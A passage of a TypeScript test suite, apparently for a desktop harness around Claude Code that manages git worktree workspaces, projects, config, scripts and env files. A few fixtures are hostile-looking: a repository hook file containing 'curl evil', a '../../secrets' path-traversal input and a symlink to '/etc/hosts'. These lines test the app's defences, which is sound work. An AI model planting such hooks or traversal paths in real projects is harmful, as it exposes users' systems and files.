                    text: '<<<OCTOPUS_TITLE>>>\nT\n<<<OCTOPUS_BODY>>>\nB\n<<<OCTOPUS_COMMIT>>>\nC'
                  }
                ]
              }
            }
          }
        }
      }) as unknown as QueryFn
    })
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)
    await mkdir(join(workspace.path, '.claude', 'hooks'), { recursive: true })
    await writeFile(join(workspace.path, '.claude', 'hooks', 'start.sh'), 'curl evil\n', 'utf8')

    await service.draftPullRequest(workspace.id)
    await approveSettingsIn(service, workspace.id)
    await service.draftPullRequest(workspace.id)

    expect(asked).toEqual([['user'], ['user', 'project', 'local']])
  })

  /*
   * Which branch work is cut from is a fact about the repository, so the
   * checkout's `.octopus/project.json` decides it live — a team that moved to
   * `develop` moves every clone with it. Read from the checkout, so a feature
   * branch cannot re-point its own base.
   */
  it('cuts a workspace from the base branch the repository names', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    await run('git', ['checkout', '-q', '-b', 'develop'], { cwd: repo })
    await writeFile(join(repo, 'only-on-develop.txt'), 'yes\n', 'utf8')
    await run('git', ['add', '-A'], { cwd: repo })
    await run('git', ['commit', '-q', '-m', 'develop'], { cwd: repo })
    await run('git', ['checkout', '-q', 'main'], { cwd: repo })
    const project = await service.addProjectFromPath(repo)
    // The repository's word is taken once it is trusted, as its scripts are.
    await service.updateProjectById(project.id, { trustRepository: true })
    expect(project.baseBranch).toBe('main')

    await mkdir(join(repo, '.octopus'), { recursive: true })
    await writeFile(join(repo, '.octopus', 'project.json'), '{"baseBranch":"develop"}', 'utf8')
    const workspace = await service.createWorkspaceIn(project.id)

    await expect(readFile(join(workspace.path, 'only-on-develop.txt'), 'utf8')).resolves.toBe(
      'yes\n'
    )
    const sources = await service.projectSources(project.id, workspace.id)
    expect(sources.find((view) => view.id === 'project.baseBranch')).toMatchObject({
      effective: 'repository',
      warning: null
    })
    // The stored record keeps the user's own, for "use mine instead".
    expect(service.listProjects()[0]?.baseBranch).toBe('main')
  })

  // A checkout git cannot answer for keeps the stored values rather than
  // failing every read that asks for a field.
  it('keeps the stored env file when git cannot check the stated one', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)
    // The repository's word is taken once it is trusted, as its scripts are.
    await service.updateProjectById(project.id, { trustRepository: true })
    await service.saveEnvProfile(project.id, 'default', 'API_KEY=secret\n')
    const workspace = await service.createWorkspaceIn(project.id)
    await mkdir(join(repo, '.octopus'), { recursive: true })
    await writeFile(join(repo, '.octopus', 'project.json'), '{"envFile":".env.local"}', 'utf8')
    await rm(join(repo, '.git'), { recursive: true, force: true })

    await expect(service.readWorkspaceEnv(workspace.id)).resolves.toContain('API_KEY=secret')
  })

  it('says a workspace that changed nothing changed nothing', async () => {
    const { service, projectId } = await withProject()
    const workspace = await service.createWorkspaceIn(projectId)

    await expect(service.readWorkspaceChanges(workspace.id)).resolves.toMatchObject({
      diff: { files: [] }
    })
  })

  it('resolves a file inside a workspace to an absolute path', async () => {
    const { service, projectId } = await withProject()
    const workspace = await service.createWorkspaceIn(projectId)

    await expect(service.resolveWorkspaceFile(workspace.id, 'README.md')).resolves.toBe(
      await realpath(join(workspace.path, 'README.md'))
    )
  })

  it('refuses to resolve a path that climbs out of the workspace', async () => {
    const { service, projectId } = await withProject()
    const workspace = await service.createWorkspaceIn(projectId)

    await expect(service.resolveWorkspaceFile(workspace.id, '../../secrets')).rejects.toThrow(
      WorkspaceError
    )
  })

  // The check the lexical one cannot make: a symlink is something the agent can
  // leave in the worktree, and following it is what the system would do.
  it('refuses to resolve a symlink that points out of the workspace', async () => {
    const { service, projectId } = await withProject()
    const workspace = await service.createWorkspaceIn(projectId)
    await symlink('/etc/hosts', join(workspace.path, 'notes.txt'))

    await expect(service.resolveWorkspaceFile(workspace.id, 'notes.txt')).rejects.toThrow(
      WorkspaceError
    )
  })

  describe('the Files tab', () => {
    it('reads the worktree of the workspace asked about, with its marks', async () => {
      const { service, projectId } = await withProject()
      const workspace = await service.createWorkspaceIn(projectId)
      await writeFile(join(workspace.path, 'fresh.ts'), 'x\n', 'utf8')

      const tree = await service.readFileTree(workspace.id)

      expect(tree.entries.map((entry) => entry.path)).toEqual(
        expect.arrayContaining(['README.md', 'fresh.ts'])
      )
      expect(tree.statuses).toEqual({ 'fresh.ts': 'untracked' })
    })

    it('lists a folder of the workspace from disk', async () => {
      const { service, projectId } = await withProject()
      const workspace = await service.createWorkspaceIn(projectId)
      await mkdir(join(workspace.path, 'node_modules'))
      await writeFile(join(workspace.path, 'node_modules', 'a.js'), '', 'utf8')

      await expect(service.readWorkspaceDirectory(workspace.id, 'node_modules')).resolves.toEqual({
        entries: [{ name: 'a.js', kind: 'file' }],
        truncated: false
      })
    })

    it('reads a file of the workspace, and shows what HEAD had of one deleted', async () => {
      const { service, projectId } = await withProject()
      const workspace = await service.createWorkspaceIn(projectId)
      const readme = await readFile(join(workspace.path, 'README.md'), 'utf8')

      await expect(service.readWorkspaceFile(workspace.id, 'README.md')).resolves.toMatchObject({
        kind: 'text',
        text: readme
      })

      await rm(join(workspace.path, 'README.md'))
      await expect(service.readWorkspaceFile(workspace.id, 'README.md')).resolves.toEqual({
        kind: 'deleted',
        text: readme
      })
    })

    it('refuses a workspace that does not exist, for each read', async () => {
      const { service } = await withProject()

      await expect(service.readFileTree('missing')).rejects.toThrow()
      await expect(service.readWorkspaceDirectory('missing', 'a')).rejects.toThrow()
      await expect(service.readWorkspaceFile('missing', 'a')).rejects.toThrow()
    })
  })

  it('refuses to remove a workspace holding uncommitted work', async () => {
    const { service, projectId } = await withProject()
    const workspace = await service.createWorkspaceIn(projectId)
    await writeFile(join(workspace.path, 'draft.txt'), 'work\n', 'utf8')

    await expect(service.removeWorkspaceById(workspace.id)).rejects.toThrow()
    await expect(service.listWorkspaces(projectId)).resolves.toHaveLength(1)
  })

  it('removes a workspace once forced', async () => {
    const { service, projectId } = await withProject()
    const workspace = await service.createWorkspaceIn(projectId)
    await writeFile(join(workspace.path, 'draft.txt'), 'work\n', 'utf8')

    await service.removeWorkspaceById(workspace.id, { force: true })
    await expect(service.listWorkspaces(projectId)).resolves.toEqual([])
  })

  it('gives each workspace a distinct name', async () => {
    const { service, projectId } = await withProject()
    const first = await service.createWorkspaceIn(projectId)
    const second = await service.createWorkspaceIn(projectId)

    expect(second.name).not.toBe(first.name)
  })

  it('reports nothing for a project that does not exist', async () => {
    const service = await createService(paths(dir))
    await expect(service.listWorkspaces('missing')).resolves.toEqual([])
  })

  it('refuses to act on a workspace that does not exist', async () => {
    const service = await createService(paths(dir))

    await expect(service.renameWorkspaceById('missing', 'name')).rejects.toThrow()
    await expect(service.removeWorkspaceById('missing')).rejects.toThrow()
    await expect(service.workspaceHasChanges('missing')).rejects.toThrow()
  })

  // A worktree without a record is invisible to the app but blocks every
  // later attempt with "already exists", so a failed create must clean up.
  it('leaves nothing behind when the record cannot be stored', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)

    const service = await createService(paths(dir))
    const project = await service.addProjectFromPath(repo)

    // Make the state file unwritable so committing the record fails after the
    // worktree already exists.
    await service.createWorkspaceIn(project.id)
    await rm(join(dir, 'state.json'))
    await mkdir(join(dir, 'state.json'))

    await expect(service.createWorkspaceIn(project.id)).rejects.toThrow()

    // The second workspace's directory must be gone again.
    const worktrees = await listWorktrees(gitIn(repo))
    expect(worktrees).toHaveLength(2)
  })

  it('refuses to create a workspace in a project that does not exist', async () => {
    const service = await createService(paths(dir))
    await expect(service.createWorkspaceIn('missing')).rejects.toThrow()
  })

  // A repository that cannot be read must not blank the list — the records
  // are still there, and hiding them would look like data loss.
  it('still lists workspaces when git cannot be read', async () => {
    const { service, projectId } = await withProject()
    const workspace = await service.createWorkspaceIn(projectId)

    // Point the project at a directory that is not a repository.
    const broken = await createService({
      ...paths(dir),
      makeExec: () => () => Promise.reject(new Error('not a repository'))
    })

    const listed = await broken.listWorkspaces(projectId)
    expect(listed).toHaveLength(1)
    expect(listed[0]?.id).toBe(workspace.id)
    // Not missing: git said nothing, which is not the same as saying the
    // worktree is gone. This assertion used to read `true`, and in doing so
    // fixed the bug in place — a failure to ask closed every terminal.
    expect(listed[0]?.missing).toBe(false)
  })

  it('falls back to the default root when none is configured', async () => {
    // Only the state paths are overridden here; dataRoot is left out, so the
    // default location is used. Creation is expected to fail because that
    // project does not exist — enough to exercise the branch without writing
    // into the real home directory.
    const service = await createService({
      stateFilePath: join(dir, 'plain-state.json'),
      stateTempFilePath: join(dir, 'plain-state.json.tmp'),
      configFilePath: join(dir, 'plain-config.json')
    })

    await expect(service.createWorkspaceIn('missing')).rejects.toThrow()
  })

  // Removing the project should not strand its workspaces in the store.
  it('drops workspaces along with their project', async () => {
    const { service, projectId } = await withProject()
    await service.createWorkspaceIn(projectId)

    await service.removeProjectById(projectId)
    await expect(service.listWorkspaces(projectId)).resolves.toEqual([])
  })
})

describe('config', () => {
  // octopus is a harness around Claude Code, not a filter on it: a fresh
  // install reads the project's `CLAUDE.md`, commands and skills, as the CLI
  // does.
  it('is created with defaults on first run', () => {
    expect(service.getConfig().settingSources).toBe('all')
  })

  it('persists updates across a restart', async () => {
    await service.updateConfig({ theme: 'dark', branchPrefix: 'ytsykvas' })

    const restarted = await createService(paths(dir))
    expect(restarted.getConfig()).toMatchObject({ theme: 'dark', branchPrefix: 'ytsykvas' })
  })

  it('returns the updated config', async () => {
    const updated = await service.updateConfig({ settingSources: 'project' })
    expect(updated.settingSources).toBe('project')
    expect(service.getConfig().settingSources).toBe('project')
  })

  /*
   * The patch arrives over IPC as a `Partial<Config>` and nothing validated it.
   * `saveConfig` parses before writing, so the file stayed right while the copy
   * held in memory was whatever came — and the two disagreed until the next
   * restart, which is a bug that survives a screenshot.
   */
  it('refuses a patch the schema does not accept, rather than holding it', async () => {
    const before = service.getConfig().rightPanelWidth

    await expect(service.updateConfig({ rightPanelWidth: 12 })).rejects.toBeDefined()

    expect(service.getConfig().rightPanelWidth).toBe(before)
  })

  /*
   * Two updates in flight used to race. Each wrote the one temporary file and
   * renamed it, so the second rename found it gone and rejected with ENOENT —
   * "Something went wrong" in the window — and each built its result from a
   * config the other had not stored yet, so the slower one put the faster
   * one's field back. Ten arrow-key nudges of the right pane's edge did it.
   */
  it('keeps both of two updates made at once', async () => {
    const both = Promise.all([
      service.updateConfig({ rightPanelWidth: 400 }),
      service.updateConfig({ theme: 'dark' })
    ])

    await expect(both).resolves.toHaveLength(2)
    expect(service.getConfig()).toMatchObject({ rightPanelWidth: 400, theme: 'dark' })
    const restarted = await createService(paths(dir))
    expect(restarted.getConfig()).toMatchObject({ rightPanelWidth: 400, theme: 'dark' })
  })

  // A write that failed is not a reason to stop making the rest.
  it('goes on writing after an update it refused', async () => {
    const refused = service.updateConfig({ rightPanelWidth: 12 })
    const accepted = service.updateConfig({ theme: 'dark' })

    // The schema's refusal, not a lost race for the temporary file.
    await expect(refused).rejects.toMatchObject({ name: 'ZodError' })
    await expect(accepted).resolves.toMatchObject({ theme: 'dark' })
  })

  // Applied inside the write's turn, so edits made at once all land
  // (`ConfigEditSchema`).
  it('keeps every one of several list edits made at once', async () => {
    await Promise.all([
      service.editConfig({ kind: 'skillDefault', key: 'review', enabled: false }),
      service.editConfig({ kind: 'skillDefault', key: 'ship', enabled: false }),
      service.editConfig({ kind: 'dismissTip', id: 'tabs' })
    ])

    expect(service.getConfig()).toMatchObject({
      disabledSkillDefaults: ['review', 'ship'],
      dismissedTips: ['tabs']
    })
  })

  it('answers an edit with the config as it now stands', async () => {
    await expect(service.editConfig({ kind: 'dismissTip', id: 'tabs' })).resolves.toMatchObject({
      dismissedTips: ['tabs']
    })
  })

  // Quitting waits for a write still being made, or the old file survives the
  // last change before Cmd-Q and a temporary file is left beside it.
  it('finishes a config write before it is done shutting down', async () => {
    const writing = service.updateConfig({ theme: 'dark' })

    await service.closeChats()

    const onDisk: unknown = JSON.parse(await readFile(join(dir, 'config.json'), 'utf8'))
    expect(onDisk).toMatchObject({ theme: 'dark' })
    await writing
  })
})

describe('projects', () => {
  // The config's list edits one layer down, for the same reason.
  it('keeps both of two list edits made to a project at once', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)

    // Two switches of the same list: the case a list sent whole got wrong.
    await Promise.all([
      service.editProjectById(project.id, { kind: 'skillDefault', key: 'review', enabled: false }),
      service.editProjectById(project.id, { kind: 'skillDefault', key: 'ship', enabled: false })
    ])

    // Both, in whichever order the two writes took their turns.
    expect(service.listProjects()[0]?.disabledSkillDefaults.toSorted()).toEqual(['review', 'ship'])
  })

  it('starts with an empty list', () => {
    expect(service.listProjects()).toHaveLength(0)
  })

  it('shows an added project in the list', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)

    const project = await service.addProjectFromPath(repo)
    expect(project.name).toBe('planner')
    expect(service.listProjects()).toHaveLength(1)
  })

  it('keeps the project across an application restart', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    await service.addProjectFromPath(repo)

    const restarted = await createService(paths(dir))
    expect(restarted.listProjects()).toHaveLength(1)
    expect(restarted.listProjects()[0]?.name).toBe('planner')
  })

  it('takes the branch prefix from the config', async () => {
    await service.updateConfig({ branchPrefix: 'ytsykvas' })
    const repo = join(dir, 'planner')
    await initRepo(repo)

    const project = await service.addProjectFromPath(repo)
    expect(project.branchPrefix).toBe('ytsykvas')
  })

  it('does not add the same directory twice', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    await service.addProjectFromPath(repo)

    await expect(service.addProjectFromPath(repo)).rejects.toThrow(/already added/)
  })

  it('does not add a directory that is not a repository', async () => {
    const plain = join(dir, 'plain-directory')
    await mkdir(plain)

    await expect(service.addProjectFromPath(plain)).rejects.toThrow(/is not a git repository/)
  })

  it('renames a project and keeps the change across a restart', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)

    await service.updateProjectById(project.id, { name: 'Weekly planner' })
    expect(service.listProjects()[0]?.name).toBe('Weekly planner')

    const restarted = await createService(paths(dir))
    expect(restarted.listProjects()[0]?.name).toBe('Weekly planner')
  })

  it('refuses to update a project that is not there', async () => {
    await expect(service.updateProjectById('missing', { name: 'Name' })).rejects.toThrow()
  })

  it('changes the base branch new workspaces start from', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    await run('git', ['branch', 'develop'], { cwd: repo })
    const project = await service.addProjectFromPath(repo)

    await service.updateProjectById(project.id, { baseBranch: 'develop' })
    expect(service.listProjects()[0]?.baseBranch).toBe('develop')
  })

  // The dialog offers a list read when it opened; the branch can be gone by
  // the time one is chosen, and storing it would fail much later instead.
  it('refuses a base branch the repository does not have', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)

    await expect(
      service.updateProjectById(project.id, { baseBranch: 'never-existed' })
    ).rejects.toThrow(ProjectValidationError)

    expect(service.listProjects()[0]?.baseBranch).not.toBe('never-existed')
  })

  // Remote branches are the shared history; a local branch is one person's
  // copy that may be behind, ahead or long abandoned.
  it('offers remote branches to base a project on, not local ones', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    await run('git', ['branch', 'local-only'], { cwd: repo })

    const remote = join(dir, 'remote.git')
    await run('git', ['init', '-q', '--bare', '--initial-branch=main', remote])
    await run('git', ['remote', 'add', 'origin', remote], { cwd: repo })
    await run('git', ['push', '-q', 'origin', 'main'], { cwd: repo })
    await run('git', ['push', '-q', 'origin', 'main:develop'], { cwd: repo })
    await run('git', ['fetch', '-q', 'origin'], { cwd: repo })

    const project = await service.addProjectFromPath(repo)
    const branches = await service.listProjectBranches(project.id)

    expect(branches).toContain('origin/develop')
    expect(branches).not.toContain('local-only')
  })

  // Nothing to choose from would make the field unusable for a repository
  // that was added from disk and never had a remote.
  it('falls back to local branches when there is no remote', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    await run('git', ['branch', 'develop'], { cwd: repo })
    const project = await service.addProjectFromPath(repo)

    await expect(service.listProjectBranches(project.id)).resolves.toContain('develop')
  })

  it('accepts a remote branch as the base', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)

    const remote = join(dir, 'remote2.git')
    await run('git', ['init', '-q', '--bare', '--initial-branch=main', remote])
    await run('git', ['remote', 'add', 'origin', remote], { cwd: repo })
    await run('git', ['push', '-q', 'origin', 'main:develop'], { cwd: repo })
    await run('git', ['fetch', '-q', 'origin'], { cwd: repo })

    const project = await service.addProjectFromPath(repo)
    await service.updateProjectById(project.id, { baseBranch: 'origin/develop' })

    expect(service.listProjects()[0]?.baseBranch).toBe('origin/develop')
  })

  it('removes the project from the list and from disk', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)

    await service.removeProjectById(project.id)
    expect(service.listProjects()).toHaveLength(0)

    const restarted = await createService(paths(dir))
    expect(restarted.listProjects()).toHaveLength(0)
  })

  // Records alone are not enough: a directory or branch left behind is
  // invisible to the app but still holds its name, and adding the project back
  // would collide with its own debris.
  it('takes the workspaces of a removed project off disk with it', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)

    const first = await service.createWorkspaceIn(project.id)
    const second = await service.createWorkspaceIn(project.id)

    await service.removeProjectById(project.id)

    await expect(access(first.path)).rejects.toThrow()
    await expect(access(second.path)).rejects.toThrow()

    const worktrees = await listWorktrees(gitIn(repo))
    expect(worktrees).toHaveLength(1)

    const branches = await gitIn(repo)(['branch', '--format=%(refname:short)'])
    expect(branches).not.toContain(first.name)
    expect(branches).not.toContain(second.name)
  })

  it('discards uncommitted work in those workspaces, having been confirmed', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)
    await writeFile(join(workspace.path, 'draft.txt'), 'work\n', 'utf8')

    await service.removeProjectById(project.id)

    expect(service.listProjects()).toHaveLength(0)
    await expect(access(workspace.path)).rejects.toThrow()
  })

  // A worktree deleted from outside must not strand the project itself.
  it('removes the project even when a workspace directory is already gone', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)
    await rm(workspace.path, { recursive: true, force: true })

    await expect(service.removeProjectById(project.id)).resolves.toBeUndefined()
    expect(service.listProjects()).toHaveLength(0)
  })

  // The repository itself can be moved or deleted behind the app's back, and
  // then every git call fails. The project must still be removable, or it is
  // stuck in the sidebar forever.
  it('removes the project even when the repository itself is gone', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)
    await service.createWorkspaceIn(project.id)

    await rm(repo, { recursive: true, force: true })

    await expect(service.removeProjectById(project.id)).resolves.toBeUndefined()
    expect(service.listProjects()).toHaveLength(0)
  })

  it('keeps giving out distinct ports as workspaces pile up', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)

    const ports = new Set<number>()
    for (let i = 0; i < 5; i++) ports.add((await service.createWorkspaceIn(project.id)).port)

    expect(ports.size).toBe(5)
  })

  // Renaming to the same slug is a no-op for git, and must not be mistaken for
  // a failed rename that leaves the record pointing at a branch that moved.
  it('renaming to a different case keeps the branch and the directory', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)

    await service.renameWorkspaceById(workspace.id, workspace.name.toUpperCase())

    const listed = await service.listWorkspaces(project.id)
    expect(listed[0]?.branch).toBe(workspace.branch)
    expect(listed[0]?.missing).toBe(false)
  })

  // git keeps listing a worktree whose directory was deleted by hand, flagged
  // prunable. Trusting the list alone showed it as healthy.
  it('reports a workspace whose directory was deleted behind our back', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)

    await rm(workspace.path, { recursive: true, force: true })

    const listed = await service.listWorkspaces(project.id)
    expect(listed).toHaveLength(1)
    expect(listed[0]?.missing).toBe(true)
  })

  it('a detached workspace still reconciles rather than throwing', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)

    const inside = gitIn(workspace.path)
    const head = (await inside(['rev-parse', 'HEAD'])).trim()
    await inside(['checkout', '-q', '--detach', head])

    await expect(service.listWorkspaces(project.id)).resolves.toHaveLength(1)
  })

  // A repository that was moved answers nothing to `git worktree list`. That
  // says nothing about whether the worktrees are still there, and reporting
  // them as removed makes the UI close their terminals.
  it('does not report intact workspaces as removed when git cannot be read', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)

    await rename(repo, join(dir, 'planner-moved'))

    // The workspace directory is untouched.
    await expect(access(workspace.path)).resolves.toBeUndefined()

    const listed = await service.listWorkspaces(project.id)
    expect(listed[0]?.missing).toBe(false)
  })

  it('removing a missing project does not corrupt state', async () => {
    await expect(service.removeProjectById('missing')).resolves.toBeUndefined()
    expect(service.listProjects()).toHaveLength(0)
  })

  it('a failed add leaves already saved state intact', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    await service.addProjectFromPath(repo)

    await expect(service.addProjectFromPath(join(dir, 'missing'))).rejects.toThrow()

    const restarted = await createService(paths(dir))
    expect(restarted.listProjects()).toHaveLength(1)
  })

  it('accepts a custom git executor', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)

    let calls = 0
    const custom = await createService({
      ...paths(join(dir, 'separate')),
      makeExec: (cwd) => {
        calls++
        return async (args) => {
          const { stdout } = await run('git', [...args], { cwd })
          return stdout
        }
      }
    })

    await custom.addProjectFromPath(repo)
    expect(calls).toBeGreaterThan(0)
  })
})

describe('project scripts', () => {
  async function withProject(): Promise<string> {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    return (await service.addProjectFromPath(repo)).id
  }

  it('offers a template before anything has been written', async () => {
    const id = await withProject()
    await expect(service.readProjectScript(id, 'setup')).resolves.toContain('#!/bin/sh')
  })

  it('tells the server template where its port comes from', async () => {
    const id = await withProject()
    await expect(service.readProjectScript(id, 'run')).resolves.toContain('OCTOPUS_PORT')
  })

  it('reads back what was saved', async () => {
    const id = await withProject()
    await service.saveProjectScript(id, 'setup', 'npm ci\n')

    await expect(service.readProjectScript(id, 'setup')).resolves.toBe('npm ci\n')
  })

  // A path rather than a flag: the tab shows which file it runs and hands it
  // to a shell, and only the core knows where the data root is.
  it('reports no path until a script exists, then its location', async () => {
    const id = await withProject()

    await expect(service.projectScriptPaths(id)).resolves.toEqual({
      setup: null,
      run: null,
      archive: null
    })

    await service.saveProjectScript(id, 'run', 'echo serving\n')
    const paths = await service.projectScriptPaths(id)

    expect(paths.setup).toBeNull()
    expect(paths.run).toContain('run.sh')
  })

  it('keeps each project\u2019s scripts to itself', async () => {
    const first = await withProject()

    const other = join(dir, 'esl')
    await initRepo(other)
    const second = (await service.addProjectFromPath(other)).id

    await service.saveProjectScript(first, 'setup', 'first\n')

    await expect(service.readProjectScript(second, 'setup')).resolves.toContain('#!/bin/sh')
  })

  it('refuses to touch scripts of a project that does not exist', async () => {
    await expect(service.readProjectScript('missing', 'setup')).rejects.toThrow()
    await expect(service.saveProjectScript('missing', 'setup', 'x')).rejects.toThrow()
    await expect(service.projectScriptPaths('missing')).rejects.toThrow()
  })

  // The scripts live under the data root, not in the repository — a workspace
  // is a checkout of someone's project, not a place to leave our files.
  it('keeps scripts out of the repository', async () => {
    const id = await withProject()
    await service.saveProjectScript(id, 'setup', 'x\n')

    const paths = await service.projectScriptPaths(id)
    expect(paths.setup).not.toContain(join(dir, 'planner', '.git'))
    expect(paths.setup).toContain(join('projects', id, 'scripts'))
  })
})

describe('env overrides a project adds', () => {
  async function withProject(): Promise<{ id: string; repo: string }> {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    return { id: (await service.addProjectFromPath(repo)).id, repo }
  }

  it('is empty before anything has been written', async () => {
    const { id } = await withProject()
    await expect(service.readEnvProfile(id, 'default')).resolves.toBe('')
  })

  it('reads back what was saved', async () => {
    const { id } = await withProject()
    await service.saveEnvProfile(id, 'default', 'A=1\n')

    await expect(service.readEnvProfile(id, 'default')).resolves.toBe('A=1\n')
  })

  /*
   * Last wins. The checkout's `.env` is whatever it happened to hold — one left
   * on a production block handed a workspace production — and this is what
   * settles it without editing anybody's file.
   */
  it('writes them below whatever the checkout carried in', async () => {
    const { id, repo } = await withProject()
    await writeFile(join(repo, '.env'), 'MYSQL_HOST=production\n', 'utf8')
    await service.saveEnvProfile(id, 'default', 'MYSQL_HOST=dev.example\n')

    const workspace = await service.createWorkspaceIn(id)

    const contents = await readFile(join(workspace.path, '.env'), 'utf8')
    expect(contents.indexOf('production')).toBeLessThan(contents.indexOf('dev.example'))
  })

  /*
   * The repository's `.octopus/project.json` decides which file the stack
   * reads its variables from, live — as long as git ignores it, because the
   * credentials go there.
   */
  it('writes the block into the env file the repository names', async () => {
    const { id, repo } = await withProject()
    // The repository's word is taken once it is trusted, as its scripts are.
    await service.updateProjectById(id, { trustRepository: true })
    await writeFile(join(repo, '.gitignore'), '.env.local\n', 'utf8')
    await mkdir(join(repo, '.octopus'), { recursive: true })
    await writeFile(join(repo, '.octopus', 'project.json'), '{"envFile":".env.local"}', 'utf8')
    await run('git', ['add', '-A'], { cwd: repo })
    await run('git', ['commit', '-q', '-m', 'octopus'], { cwd: repo })
    await service.saveEnvProfile(id, 'default', 'API_KEY=secret\n')

    const workspace = await service.createWorkspaceIn(id)

    await expect(readFile(join(workspace.path, '.env.local'), 'utf8')).resolves.toContain(
      'API_KEY=secret'
    )
    await expect(service.isProjectEnvIgnored(id)).resolves.toBe(true)
    await expect(service.readWorkspaceEnv(workspace.id)).resolves.toContain('API_KEY=secret')
  })

  /*
   * "Use mine instead" moves the block back to the project's own file — and
   * takes it out of the one it was in, or the credentials stay there, live,
   * in a file nothing would revisit. The settings change is what does it here,
   * comparing the file in effect before and after.
   */
  it('moves the block out of the old file when the user chooses their own', async () => {
    const { id, repo } = await withProject()
    // The repository's word is taken once it is trusted, as its scripts are.
    await service.updateProjectById(id, { trustRepository: true })
    await writeFile(join(repo, '.gitignore'), '.env.local\n', 'utf8')
    await mkdir(join(repo, '.octopus'), { recursive: true })
    await writeFile(join(repo, '.octopus', 'project.json'), '{"envFile":".env.local"}', 'utf8')
    await run('git', ['add', '-A'], { cwd: repo })
    await run('git', ['commit', '-q', '-m', 'octopus'], { cwd: repo })
    await service.saveEnvProfile(id, 'default', 'API_KEY=secret\n')
    const workspace = await service.createWorkspaceIn(id)

    await service.editProjectById(id, { kind: 'preferLocal', item: 'project.envFile', on: true })

    // Gone at the switch, not at the next preparation — a server already
    // running goes on reading the old file until then. A file holding nothing
    // but ours is removed rather than left empty.
    const left = await readFile(join(workspace.path, '.env.local'), 'utf8').catch(() => '')
    expect(left).not.toContain('API_KEY')

    await service.prepareWorkspace(workspace.id)
    await expect(readFile(join(workspace.path, '.env'), 'utf8')).resolves.toContain(
      'API_KEY=secret'
    )
  })

  /*
   * Nothing in the app changed here — the repository did, as a pull would.
   * Only the next preparation can notice, and it knows where the block went
   * because the workspace recorded it.
   */
  it('moves the block when the repository changes the env file under a workspace', async () => {
    const { id, repo } = await withProject()
    // The repository's word is taken once it is trusted, as its scripts are.
    await service.updateProjectById(id, { trustRepository: true })
    await service.saveEnvProfile(id, 'default', 'API_KEY=secret\n')
    const workspace = await service.createWorkspaceIn(id)
    await writeFile(join(repo, '.gitignore'), '.env.local\n', 'utf8')
    await mkdir(join(repo, '.octopus'), { recursive: true })
    await writeFile(join(repo, '.octopus', 'project.json'), '{"envFile":".env.local"}', 'utf8')

    // The branch picked the ignore rule up too, as a pull would bring it.
    await writeFile(join(workspace.path, '.gitignore'), '.env.local\n', 'utf8')

    await service.prepareWorkspace(workspace.id)

    await expect(readFile(join(workspace.path, '.env.local'), 'utf8')).resolves.toContain(
      'API_KEY=secret'
    )
    await expect(readFile(join(workspace.path, '.env'), 'utf8')).rejects.toThrow()
  })

  // Not trusted, the repository's file waits: the project's own is written.
  it("keeps the project's env file while the repository is not trusted", async () => {
    const { id, repo } = await withProject()
    await writeFile(join(repo, '.gitignore'), '.env.local\n', 'utf8')
    await mkdir(join(repo, '.octopus'), { recursive: true })
    await writeFile(join(repo, '.octopus', 'project.json'), '{"envFile":".env.local"}', 'utf8')
    await run('git', ['add', '-A'], { cwd: repo })
    await run('git', ['commit', '-q', '-m', 'octopus'], { cwd: repo })
    await service.saveEnvProfile(id, 'default', 'API_KEY=secret\n')

    const workspace = await service.createWorkspaceIn(id)

    await expect(readFile(join(workspace.path, '.env'), 'utf8')).resolves.toContain('API_KEY')
    const sources = await service.projectSources(id, workspace.id)
    expect(sources.find((view) => view.id === 'project.envFile')).toMatchObject({
      effective: 'project',
      warning: 'repositoryNotTrusted'
    })
  })

  /*
   * The checkout ignores the file; the branch the workspace is on may not.
   * The credentials land in the worktree, so it is asked there too.
   */
  it("writes the project's own env file where the workspace's branch would commit the stated one", async () => {
    const { id, repo } = await withProject()
    await writeFile(join(repo, '.gitignore'), '.env.local\n', 'utf8')
    await mkdir(join(repo, '.octopus'), { recursive: true })
    await writeFile(join(repo, '.octopus', 'project.json'), '{"envFile":".env.local"}', 'utf8')
    await run('git', ['add', '-A'], { cwd: repo })
    await run('git', ['commit', '-q', '-m', 'octopus'], { cwd: repo })
    await service.updateProjectById(id, { trustRepository: true })
